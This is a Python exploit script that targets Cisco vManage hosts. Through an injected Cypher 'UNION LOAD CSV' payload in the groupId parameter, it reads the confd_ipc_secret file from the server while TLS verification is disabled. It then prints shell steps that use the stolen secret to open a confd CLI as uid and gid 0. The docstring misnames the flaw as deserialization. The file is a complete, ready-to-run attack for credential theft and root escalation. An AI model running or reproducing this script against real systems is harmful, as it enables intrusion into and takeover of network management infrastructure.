#!/usr/bin/env python3
"""
Extract confd_ipc_secret from Neo4j deserialization vulnerability.

Usage:
    python3 extract_conf_secret.py <vmanage-host> <port>

Example:
    python3 extract_conf_secret.py vmanage-XXXXXX.viptela.net 443
"""

import sys
import urllib.request
import urllib.parse
import json

def extract_secret(host, port=443, use_https=True):
    """Extract the confd_ipc_secret using Neo4j deserialization."""
    
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}/dataservice/group/devices"
    
    # Craft the malicious groupId parameter
    # This uses UNION LOAD CSV to read the secret file
    payload = "test'<>\"test\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+'"
    
    params = urllib.parse.urlencode({"groupId": payload})
    full_url = f"{url}?{params}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
    }
    
    try:
        req = urllib.request.Request(full_url, headers=headers)
        
        # Handle SSL verification (disable for testing)
        import ssl
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with urllib.request.urlopen(req, context=context) as response:
            data = json.loads(response.read().decode())
            
            # Extract the secret from the response
            if "data" in data and len(data["data"]) > 0:
                secret = data["data"][0].get("n", [""])[0]
                print(f"[+] Extracted secret: {secret}")
                return secret
            else:
                print("[-] No secret found in response")
                return None
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} {e.reason}")
        return None
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <vmanage-host> [port] [--http]")
        print("Example: python3 extract_conf_secret.py vmanage-XXXXXX.viptela.net 443")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    use_https = "--http" not in sys.argv
    
    secret = extract_secret(host, port, use_https)
    
    if secret:
        print(f"\n[+] Next steps:")
        print(f"    echo -n '{secret}' > /tmp/ipc_secret")
        print(f"    export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret")
        print(f"    /usr/bin/confd_cli_user -U 0 -G 0")
    
if __name__ == "__main__":
    main()
